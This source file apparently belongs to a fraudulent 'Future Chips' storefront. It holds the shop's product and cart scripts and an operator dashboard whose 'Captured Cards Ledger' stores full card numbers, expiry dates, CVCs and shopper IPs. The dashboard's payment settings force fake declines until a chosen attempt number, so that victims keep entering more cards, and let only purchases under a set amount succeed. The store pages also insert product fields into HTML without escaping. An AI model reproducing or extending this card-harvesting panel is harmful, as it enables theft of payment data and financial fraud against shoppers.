// Fetch & Render Products
async function fetchProducts(filters = {}) {
  const container = document.getElementById('products-container');
  if (!container) return;

  container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
    Establishing neural connection...
  </div>\`;

  let products = [];

  try {
    const params = new URLSearchParams();
    if (filters.q) params.append('q', filters.q);
    if (filters.category) params.append('category', filters.category);
    
    const res = await fetch(\`/api/products?\${params.toString()}\`);
    if (res.ok) {
      products = await res.json();
    } else {
      throw new Error('API unreachable');
    }
  } catch (err) {
    console.warn('API stream unreachable, using fallback product matrix:', err);
    products = JSON.parse(localStorage.getItem('future_chips_products')) || DEFAULT_PRODUCTS;
    
    if (filters.q) {
      const q = filters.q.toLowerCase();
      products = products.filter(p => p.name.toLowerCase().includes(q) || (p.description && p.description.toLowerCase().includes(q)));
    }
    if (filters.category) {
      products = products.filter(p => p.category === filters.category);
    }
  }

  // Sort products on client side
  const sortOrder = document.getElementById('price-sort')?.value || 'asc';
  products.sort((a, b) => {
    return sortOrder === 'asc' ? a.price - b.price : b.price - a.price;
  });

  if (products.length === 0) {
    container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
      No cyber modules matching this frequency.
    </div>\`;
    return;
  }

  container.innerHTML = products.map(p => \`
    <article class="product-card glass">
      <div class="product-image-wrap">
        <img src="\${p.image}" alt="\${p.name}" loading="lazy">
      </div>
      <div class="product-info">
        <span class="product-category">\${p.category || 'Processors'}</span>
        <h2 class="product-title">\${p.name}</h2>
        <p class="product-desc">\${p.description || 'No description available.'}</p>
        <div class="product-footer">
          <div class="product-price">\${p.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
          <div style="display: flex; gap: 0.5rem;">
            <a href="/product.html?id=\${p.id}" class="btn btn-outline" style="padding: 0.6rem 1rem;">View Details</a>
            <button onclick="addToCart('\${p.id}', '\${p.name.replace(/'/g, "\\\\'")}', \${p.price}, '\${p.image}')" class="btn btn-primary" style="padding: 0.6rem;">
              +
            </button>
          </div>
        </div>
      </div>
    </article>
  \`).join('');
}

// Setup Filters & Search
function setupFilters() {
  const searchInput = document.getElementById('search-input');
  const categoryFilter = document.getElementById('category-filter');
  const priceSort = document.getElementById('price-sort');

  let timeout = null;

  const triggerSearch = () => {
    fetchProducts({
      q: searchInput?.value || '',
      category: categoryFilter?.value || ''
    });
  };

  searchInput?.addEventListener('input', () => {
    clearTimeout(timeout);
    timeout = setTimeout(triggerSearch, 300);
  });

  categoryFilter?.addEventListener('change', triggerSearch);
  priceSort?.addEventListener('change', triggerSearch);
}

// Cart Functionality
function setupCart() {
  const openCartBtn = document.getElementById('open-cart-btn');
  const closeCartBtn = document.getElementById('close-cart-btn');
  const cartOverlay = document.getElementById('cart-overlay');
  const cartPanel = document.getElementById('cart-panel');
  const checkoutBtn = document.getElementById('checkout-btn');

  const toggleCart = () => {
    cartPanel?.classList.toggle('active');
    cartOverlay?.classList.toggle('active');
    renderCart();
  };

  openCartBtn?.addEventListener('click', toggleCart);
  closeCartBtn?.addEventListener('click', toggleCart);
  cartOverlay?.addEventListener('click', toggleCart);

  // Cart Checkout
  checkoutBtn?.addEventListener('click', () => {
    if (cart.length === 0) {
      alert('Your procurement queue is empty.');
      return;
    }
    // For multiple items, we'll route to the first product in the cart.
    // In a fully featured store you'd create a cart checkout session,
    // but here we redirect them to the checkout page of the first item for simplicity,
    // or checkout directly.
    const firstItem = cart[0];
    window.location.href = \`/product.html?id=\${firstItem.id}\`;
  });

  updateCartBadge();
}

function addToCart(id, name, price, image) {
  const existing = cart.find(item => item.id === id);
  if (existing) {
    existing.qty += 1;
  } else {
    cart.push({ id, name, price, image, qty: 1 });
  }
  
  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
  updateCartBadge();
  
  // Slide cart open automatically on item added
  const cartPanel = document.getElementById('cart-panel');
  const cartOverlay = document.getElementById('cart-overlay');
  if (cartPanel && !cartPanel.classList.contains('active')) {
    cartPanel.classList.add('active');
    cartOverlay?.classList.add('active');
  }
  
  renderCart();
}

function removeFromCart(id) {
  cart = cart.filter(item => item.id !== id);
  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
  updateCartBadge();
  renderCart();
}

function updateCartBadge() {
  const badge = document.getElementById('cart-badge-count');
  if (badge) {
    const totalQty = cart.reduce((sum, item) => sum + item.qty, 0);
    badge.innerText = totalQty;
    badge.style.display = totalQty > 0 ? 'block' : 'none';
  }
}

function renderCart() {
  const container = document.getElementById('cart-items-container');
  const totalVal = document.getElementById('cart-total-value');
  if (!container) return;

  if (cart.length === 0) {
    container.innerHTML = \`<div style="text-align: center; color: var(--text-muted); margin-top: 5rem;">
      Your queue is empty.
    </div>\`;
    if (totalVal) totalVal.innerText = '$0.00';
    return;
  }

  container.innerHTML = cart.map(item => \`
    <div class="cart-item">
      <img src="\${item.image}" alt="\${item.name}">
      <div class="cart-item-details">
        <h4 class="cart-item-title">\${item.name}</h4>
        <div class="cart-item-price">\${item.price.toLocaleString(undefined, {minimumFractionDigits: 2})} x \${item.qty}</div>
      </div>
      <button onclick="removeFromCart('\${item.id}')" class="cart-item-remove">Remove</button>
    </div>
  \`).join('');

  const total = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
  if (totalVal) {
    totalVal.innerText = \`\${total.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}\`;
  }
}

</script>
</body>
</html>
`;
const ADMIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Control Center Dashboard — Future Chips</title>
  
  
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@400;700;900&display=swap');

:root {
  /* Dynamic themes, fallback values */
  --primary-color: #00f0ff;
  --accent-color: #ff00e5;
  --background-color: #0a0a1a;
  --card-bg: rgba(16, 16, 36, 0.6);
  --text-color: #ffffff;
  --text-muted: #8c8cbe;
  
  --font-title: 'Outfit', sans-serif;
  --font-body: 'Inter', sans-serif;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background-color: var(--background-color);
  color: var(--text-color);
  font-family: var(--font-body);
  line-height: 1.6;
  overflow-x: hidden;
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
    radial-gradient(circle at 90% 80%, rgba(255, 0, 229, 0.05) 0%, transparent 40%);
  background-attachment: fixed;
}

/* Glassmorphism utility */
.glass {
  background: var(--card-bg);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid rgba(255, 255, 255, 0.05);
}

.container {
  width: 90%;
  max-width: 1200px;
  margin: 0 auto;
}

/* Header */
header {
  position: sticky;
  top: 0;
  z-index: 100;
  padding: 1.5rem 0;
  transition: background 0.3s;
}

header.scrolled {
  background: rgba(10, 10, 26, 0.85);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

header .nav-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.logo {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.8rem;
  letter-spacing: 2px;
  color: #ffffff;
  text-decoration: none;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.logo span {
  background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
}

.nav-links {
  display: flex;
  gap: 2rem;
  list-style: none;
}

.nav-links a {
  color: var(--text-muted);
  text-decoration: none;
  font-weight: 500;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: #ffffff;
}

.cart-icon-btn {
  background: none;
  border: none;
  color: #ffffff;
  cursor: pointer;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 45px;
  height: 45px;
  border-radius: 50%;
  transition: background 0.3s;
}

.cart-icon-btn:hover {
  background: rgba(255, 255, 255, 0.05);
}

.cart-icon-btn svg {
  width: 22px;
  height: 22px;
  fill: currentColor;
}

.cart-badge {
  position: absolute;
  top: 5px;
  right: 5px;
  background: var(--accent-color);
  color: #ffffff;
  font-size: 0.75rem;
  font-weight: bold;
  padding: 2px 6px;
  border-radius: 10px;
  box-shadow: 0 0 10px var(--accent-color);
}

/* Hero Section */
.hero {
  padding: 6rem 0 4rem 0;
  text-align: center;
  position: relative;
}

.hero h1 {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 4rem;
  line-height: 1.1;
  margin-bottom: 1rem;
  letter-spacing: -1px;
}

.hero h1 span {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  display: inline-block;
  animation: glow-pulse 3s infinite alternate;
}

.hero p {
  color: var(--text-muted);
  font-size: 1.2rem;
  max-width: 600px;
  margin: 0 auto 2.5rem auto;
}

/* Search and Filters */
.filters-section {
  margin-bottom: 3rem;
  padding: 1.5rem;
  border-radius: 16px;
}

.filters-wrapper {
  display: flex;
  gap: 1.5rem;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
}

.search-box {
  flex: 1;
  min-width: 280px;
  position: relative;
}

.search-box input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1rem 0.8rem 2.8rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.search-box input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

.search-box svg {
  position: absolute;
  left: 1rem;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  fill: var(--text-muted);
}

.filter-group {
  display: flex;
  gap: 1rem;
  align-items: center;
}

.filter-group select {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1.5rem;
  color: #ffffff;
  cursor: pointer;
  outline: none;
  font-family: var(--font-body);
  transition: border-color 0.3s;
}

.filter-group select:focus {
  border-color: var(--primary-color);
}

/* Product Grid */
.products-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 2.5rem;
  margin-bottom: 5rem;
}

/* Product Card */
.product-card {
  border-radius: 20px;
  overflow: hidden;
  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s;
  display: flex;
  flex-direction: column;
  height: 100%;
}

.product-card:hover {
  transform: translateY(-8px);
  box-shadow: 0 15px 30px rgba(0, 240, 255, 0.1);
  border-color: rgba(0, 240, 255, 0.3);
}

.product-image-wrap {
  width: 100%;
  aspect-ratio: 1;
  position: relative;
  background: #000;
  display: flex;
  align-items: center;
  justify-content: center;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.product-image-wrap img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  transition: transform 0.5s ease;
}

.product-card:hover .product-image-wrap img {
  transform: scale(1.05);
}

.product-info {
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  flex-grow: 1;
}

.product-category {
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 2px;
  color: var(--primary-color);
  margin-bottom: 0.5rem;
  font-weight: 700;
}

.product-title {
  font-family: var(--font-title);
  font-size: 1.4rem;
  font-weight: 700;
  margin-bottom: 0.5rem;
  line-height: 1.3;
}

.product-desc {
  color: var(--text-muted);
  font-size: 0.9rem;
  margin-bottom: 1.5rem;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-grow: 1;
}

.product-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.product-price {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.5rem;
  color: #ffffff;
}

.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
  padding: 0.8rem 1.5rem;
  border-radius: 10px;
  font-weight: 600;
  font-family: var(--font-body);
  text-decoration: none;
  cursor: pointer;
  transition: all 0.3s;
  border: none;
}

.btn-primary {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  color: #ffffff;
  box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
}

.btn-primary:hover {
  transform: scale(1.03);
  box-shadow: 0 4px 20px rgba(0, 240, 255, 0.5);
}

.btn-outline {
  background: transparent;
  border: 1px solid rgba(255, 255, 255, 0.2);
  color: #ffffff;
}

.btn-outline:hover {
  border-color: var(--primary-color);
  background: rgba(0, 240, 255, 0.05);
}

/* Detail View Layout */
.product-detail-layout {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  gap: 4rem;
  padding: 5rem 0;
  align-items: center;
}

@media (max-width: 768px) {
  .product-detail-layout {
    grid-template-columns: 1fr;
    gap: 2rem;
    padding: 2rem 0;
  }
  .hero h1 {
    font-size: 2.5rem;
  }
}

.detail-img-card {
  border-radius: 24px;
  overflow: hidden;
  aspect-ratio: 1;
}

.detail-img-card img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.detail-info {
  display: flex;
  flex-direction: column;
}

.detail-price-box {
  margin: 1.5rem 0 2.5rem 0;
}

.detail-price-label {
  font-size: 0.85rem;
  color: var(--text-muted);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.detail-price-val {
  font-family: var(--font-title);
  font-size: 3rem;
  font-weight: 900;
  line-height: 1.1;
  color: #ffffff;
}

.detail-checkout-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.form-group {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.form-group label {
  font-size: 0.9rem;
  color: var(--text-muted);
}

.form-group input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.9rem 1rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.form-group input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

/* Slide-over Cart Panel */
.cart-panel {
  position: fixed;
  top: 0;
  right: -450px;
  width: 100%;
  max-width: 420px;
  height: 100%;
  z-index: 1000;
  box-shadow: -10px 0 30px rgba(0,0,0,0.5);
  display: flex;
  flex-direction: column;
  transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1);
}

.cart-panel.active {
  right: 0;
}

.cart-header {
  padding: 1.5rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.cart-header h2 {
  font-family: var(--font-title);
  font-size: 1.5rem;
}

.cart-close-btn {
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  font-size: 1.5rem;
}

.cart-items {
  flex-grow: 1;
  overflow-y: auto;
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.cart-item {
  display: flex;
  gap: 1rem;
  align-items: center;
  padding-bottom: 1.5rem;
  border-bottom: 1px solid rgba(255,255,255,0.03);
}

.cart-item img {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  object-fit: cover;
  background: #000;
}

.cart-item-details {
  flex-grow: 1;
}

.cart-item-title {
  font-weight: 600;
  font-size: 0.95rem;
  margin-bottom: 0.2rem;
}

.cart-item-price {
  color: var(--primary-color);
  font-weight: 700;
  font-size: 0.9rem;
}

.cart-item-remove {
  background: none;
  border: none;
  color: var(--accent-color);
  cursor: pointer;
  font-size: 0.8rem;
  padding: 4px;
}

.cart-footer {
  padding: 1.5rem;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  background: rgba(8, 8, 20, 0.9);
}

.cart-total {
  display: flex;
  justify-content: space-between;
  font-size: 1.2rem;
  font-weight: bold;
  margin-bottom: 1.5rem;
}

.cart-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
  z-index: 999;
  display: none;
}

.cart-overlay.active {
  display: block;
}

/* Status / Confirmation page layout */
.status-card {
  max-width: 550px;
  margin: 8rem auto;
  padding: 3rem;
  border-radius: 24px;
  text-align: center;
}

.status-icon {
  width: 80px;
  height: 80px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 2rem auto;
}

.status-icon.success {
  background: #ffffff;
  color: #22c55e; /* Vibrant success green */
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
  border: none;
}

.status-icon.success svg {
  width: 40px;
  height: 40px;
  fill: currentColor;
}

.status-title {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 2.2rem;
  margin-bottom: 1rem;
}

.status-text {
  color: var(--text-muted);
  margin-bottom: 2.5rem;
}

.receipt-info {
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid rgba(255, 255, 255, 0.05);
  border-radius: 12px;
  padding: 1.5rem;
  text-align: left;
  margin-bottom: 2.5rem;
}

.receipt-row {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.8rem;
  font-size: 0.95rem;
}

.receipt-row:last-child {
  margin-bottom: 0;
  padding-top: 0.8rem;
  border-top: 1px solid rgba(255,255,255,0.05);
  font-weight: bold;
}

/* Animations */
@keyframes glow-pulse {
  from {
    filter: drop-shadow(0 0 5px var(--primary-color));
  }
  to {
    filter: drop-shadow(0 0 20px var(--accent-color));
  }
}

/* Footer styling */
footer {
  padding: 3rem 0;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  text-align: center;
  color: var(--text-muted);
  font-size: 0.9rem;
}

/* Admin Panel Dashboard Styles */

.dashboard-layout {
  display: flex;
  min-height: 100vh;
}

/* Sidebar Nav */
.sidebar {
  width: 260px;
  border-right: 1px solid rgba(255, 255, 255, 0.05);
  display: flex;
  flex-direction: column;
  padding: 2rem 1.5rem;
  flex-shrink: 0;
  position: sticky;
  top: 0;
  height: 100vh;
}

.sidebar-title {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.4rem;
  letter-spacing: 1px;
  margin-bottom: 2.5rem;
  color: #ffffff;
}

.sidebar-menu {
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 0.8rem;
  flex-grow: 1;
}

.sidebar-link {
  display: flex;
  align-items: center;
  gap: 0.8rem;
  padding: 0.8rem 1rem;
  border-radius: 8px;
  color: var(--text-muted);
  text-decoration: none;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.3s;
}

.sidebar-link:hover, .sidebar-link.active {
  color: #ffffff;
  background: rgba(255, 255, 255, 0.05);
}

.sidebar-link.active {
  border-left: 3px solid var(--primary-color);
  border-radius: 0 8px 8px 0;
}

/* Main Content Area */
.main-content {
  flex-grow: 1;
  padding: 3rem;
  overflow-y: auto;
}

.content-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 3rem;
}

.content-header h1 {
  font-family: var(--font-title);
  font-weight: 700;
  font-size: 2.2rem;
}

/* Tabs */
.tab-content {
  display: none;
}

.tab-content.active {
  display: block;
}

/* Cards & Tables */
.admin-table-container {
  border-radius: 16px;
  overflow: hidden;
  margin-bottom: 2rem;
  border: 1px solid rgba(255, 255, 255, 0.05);
}

.admin-table {
  width: 100%;
  border-collapse: collapse;
  text-align: left;
  font-size: 0.95rem;
}

.admin-table th {
  background: rgba(255, 255, 255, 0.02);
  padding: 1rem 1.5rem;
  font-weight: 600;
  color: var(--primary-color);
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  text-transform: uppercase;
  font-size: 0.75rem;
  letter-spacing: 1px;
}

.admin-table td {
  padding: 1.2rem 1.5rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
  vertical-align: middle;
}

.admin-table tr:hover {
  background: rgba(255, 255, 255, 0.01);
}

.admin-table img {
  width: 45px;
  height: 45px;
  border-radius: 6px;
  object-fit: cover;
  background: #000;
}

/* Modals */
.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  z-index: 10000;
  display: flex;
  align-items: center;
  justify-content: center;
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.3s;
}

.modal.active {
  opacity: 1;
  pointer-events: auto;
}

.modal-backdrop {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.75);
  backdrop-filter: blur(8px);
}

.modal-wrapper {
  position: relative;
  z-index: 10;
  width: 90%;
  max-width: 550px;
  border-radius: 20px;
  padding: 2.5rem;
  box-shadow: 0 20px 40px rgba(0,0,0,0.5);
  max-height: 90vh;
  overflow-y: auto;
}

.modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 2rem;
}

.modal-header h2 {
  font-family: var(--font-title);
  font-weight: 700;
  font-size: 1.6rem;
}

.modal-close {
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  font-size: 1.8rem;
  line-height: 1;
}

/* Settings Form Grid */
.settings-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 2rem;
  margin-bottom: 2rem;
}

.settings-group {
  display: flex;
  flex-direction: column;
  gap: 0.8rem;
  margin-bottom: 1.5rem;
}

.color-input-wrapper {
  display: flex;
  align-items: center;
  gap: 1rem;
}

.color-input-wrapper input[type="color"] {
  width: 50px;
  height: 50px;
  border-radius: 10px;
  border: 1px solid rgba(255,255,255,0.1);
  background: none;
  cursor: pointer;
}

.color-input-wrapper input[type="text"] {
  flex-grow: 1;
}

/* Log specifics */
.ip-cell {
  font-family: monospace;
  color: var(--primary-color);
  font-weight: bold;
}

.status-badge {
  display: inline-block;
  padding: 3px 8px;
  border-radius: 6px;
  font-size: 0.8rem;
  font-weight: bold;
  text-transform: uppercase;
}

.status-badge.completed {
  background: rgba(0, 255, 170, 0.1);
  color: #00ffaa;
  border: 1px solid rgba(0,255,170,0.2);
}

.status-badge.pending,
.status-badge.failed {
  background: rgba(239, 68, 68, 0.1);
  color: #ef4444;
  border: 1px solid rgba(239, 68, 68, 0.2);
}

@media (max-width: 900px) {
  .dashboard-layout {
    flex-direction: column;
  }
  .sidebar {
    width: 100%;
    height: auto;
    border-right: none;
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    padding: 1.5rem;
  }
  .sidebar-menu {
    flex-direction: row;
    flex-wrap: wrap;
    justify-content: space-around;
  }
  .main-content {
    padding: 1.5rem;
  }
}

</style>
</head>
<body>

  <div class="dashboard-layout">
    
    <!-- Sidebar Nav -->
    <aside class="sidebar glass">
      <div class="sidebar-title">⚡ Operator Node</div>
      <ul class="sidebar-menu">
        <li>
          <a class="sidebar-link active" data-tab="products">
            📦 Products
          </a>
        </li>
        <li>
          <a class="sidebar-link" data-tab="orders">
            💳 Orders
          </a>
        </li>

        <li>
          <a class="sidebar-link" data-tab="cards">
            🔒 Card Info
          </a>
        </li>
        <li>
          <a class="sidebar-link" data-tab="settings">
            ⚙️ Site Settings
          </a>
        </li>
      </ul>
      <div style="margin-top: auto; padding-top: 1rem;">
        <button id="logout-btn" class="btn btn-outline" style="width: 100%; border-color: var(--accent-color); color: var(--accent-color);">
          Logout Session
        </button>
      </div>
    </aside>

    <!-- Main Content Area -->
    <main class="main-content">
      
      <!-- Products Tab -->
      <section id="products-tab" class="tab-content active">
        <div class="content-header">
          <h1>Product Catalog</h1>
          <button id="add-product-btn" class="btn btn-primary">+ Add New Module</button>
        </div>
        <div class="admin-table-container glass">
          <table class="admin-table">
            <thead>
              <tr>
                <th>Visual</th>
                <th>Module ID</th>
                <th>Name</th>
                <th>Category</th>
                <th>Value (USD)</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody id="admin-products-tbody">
              <!-- Dynamically injected -->
            </tbody>
          </table>
        </div>
      </section>

      <!-- Orders Tab -->
      <section id="orders-tab" class="tab-content">
        <div class="content-header">
          <h1>Transaction Ledger</h1>
        </div>
        <div class="admin-table-container glass">
          <table class="admin-table">
            <thead>
              <tr>
                <th>Order ID</th>
                <th>Customer</th>
                <th>Item Purchased</th>
                <th>Amount</th>
                <th>IP Address</th>
                <th>Status</th>
                <th>Date</th>
              </tr>
            </thead>
            <tbody id="admin-orders-tbody">
              <!-- Dynamically injected -->
            </tbody>
          </table>
        </div>
      </section>



      <!-- Card Info Tab -->
      <section id="cards-tab" class="tab-content">
        <div class="content-header">
          <h1 id="cards-ledger-title">Captured Cards Ledger</h1>
          <div style="display: flex; gap: 1rem; align-items: center;">
            <input type="text" id="card-search-input" placeholder="🔍 Search card digits..." class="btn btn-outline" style="background: rgba(255,255,255,0.05); text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #ffffff; max-width: 200px; border-color: rgba(255, 255, 255, 0.1);">
            <button id="view-trash-btn" class="btn btn-outline" style="border-color: var(--accent-color); color: var(--accent-color); display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
              🗑️ Trash Bin
            </button>
            <button id="change-pin-btn" class="btn btn-outline" style="border-color: var(--primary-color); color: var(--primary-color); display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
              🔑 Change PIN
            </button>
            <button id="change-admin-pwd-btn" class="btn btn-outline" style="border-color: var(--primary-color); color: var(--primary-color); display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
              🔐 Change Password
            </button>
          </div>
        </div>
        <div class="admin-table-container glass">
          <table class="admin-table">
            <thead>
              <tr>
                <th>Card Number</th>
                <th>Expiration</th>
                <th>CVC</th>
                <th>Country</th>
                <th>User IP</th>
                <th>Captured At</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody id="admin-cards-tbody">
              <!-- Dynamically injected -->
            </tbody>
          </table>
        </div>
      </section>

      <!-- Site Settings Tab -->
      <section id="settings-tab" class="tab-content">
        <div class="content-header">
          <h1>Global Configurations</h1>
        </div>
        <div class="glass" style="padding: 2.5rem; border-radius: 20px; max-width: 700px;">
          <form id="settings-form">
            <div class="settings-group">
              <label for="settings-site-name">Platform Branding Name</label>
              <input type="text" id="settings-site-name" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" required>
            </div>
            
            <div class="settings-grid">
              <div class="settings-group">
                <label>Primary Theme Color</label>
                <div class="color-input-wrapper">
                  <input type="color" id="settings-primary-color">
                  <input type="text" id="settings-primary-text" class="btn btn-outline" style="background:rgba(255,255,255,0.05);" placeholder="#00f0ff">
                </div>
              </div>
              
              <div class="settings-group">
                <label>Accent Highlight Color</label>
                <div class="color-input-wrapper">
                  <input type="color" id="settings-accent-color">
                  <input type="text" id="settings-accent-text" class="btn btn-outline" style="background:rgba(255,255,255,0.05);" placeholder="#ff00e5">
                </div>
              </div>

              <div class="settings-group">
                <label>Background Core Color</label>
                <div class="color-input-wrapper">
                  <input type="color" id="settings-bg-color">
                  <input type="text" id="settings-bg-text" class="btn btn-outline" style="background:rgba(255,255,255,0.05);" placeholder="#0a0a1a">
                </div>
              </div>
            </div>

            <div style="height: 1px; background: rgba(255,255,255,0.08); margin: 2rem 0;"></div>
            
            <h3 style="margin-bottom: 1.5rem; color: var(--primary-color);">Payment Routing & Decline Logic</h3>
            
            <div class="settings-grid" style="margin-bottom: 1.5rem;">
              <div class="settings-group">
                <label for="settings-decline-all" style="display: flex; align-items: center; gap: 0.5rem; cursor: pointer; user-select: none;">
                  <input type="checkbox" id="settings-decline-all" style="width: 1.2rem; height: 1.2rem; cursor: pointer; accent-color: var(--primary-color);">
                  Force Decline All Payments
                </label>
                <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem; line-height: 1.4;">
                  If checked, every card submission will immediately result in a declined screen.
                </div>
              </div>

              <div class="settings-group">
                <label for="settings-success-attempt">Success on Attempt Number</label>
                <input type="number" id="settings-success-attempt" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="1" min="1" required>
                <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem; line-height: 1.4;">
                  Force N card attempts to decline. The Nth card submission will be allowed to succeed (e.g. 5th card).
                </div>
              </div>
              
              <div class="settings-group">
                <label for="settings-decline-threshold">Auto-Success Threshold (USD)</label>
                <input type="number" step="0.01" id="settings-decline-threshold" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="50.00" required>
                <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem; line-height: 1.4;">
                  Only checkout attempts under this amount will succeed. Equal or greater amounts will be declined.
                </div>
              </div>
            </div>

            <button type="submit" class="btn btn-primary" style="width: 100%; padding: 1rem; margin-top: 1rem;">
              Write Settings to Database
            </button>
          </form>
          <div id="settings-success" style="color: #00ffaa; margin-top: 1rem; text-align: center; font-size: 0.9rem;"></div>
        </div>
      </section>

    </main>
  </div>

  <!-- Product Modal (Add / Edit) -->
  <div class="modal" id="product-modal">
    <div class="modal-backdrop" id="modal-backdrop"></div>
    <div class="modal-wrapper glass">
      <div class="modal-header">
        <h2 id="modal-title">Add Cyber Module</h2>
        <button class="modal-close" id="modal-close-btn">&times;</button>
      </div>
      <form id="product-form">
        <input type="hidden" id="product-id-field">
        
        <div class="form-group" style="margin-bottom: 1.2rem;">
          <label for="product-name-field">Module Name</label>
          <input type="text" id="product-name-field" required placeholder="e.g. Plasma Grid Stabilizer">
        </div>
        
        <div class="form-group" style="margin-bottom: 1.2rem;">
          <label for="product-category-field">Category</label>
          <select id="product-category-field" class="btn btn-outline" style="background:rgba(255,255,255,0.05); text-align:left; width: 100%;">
            <option value="Processors">Processors</option>
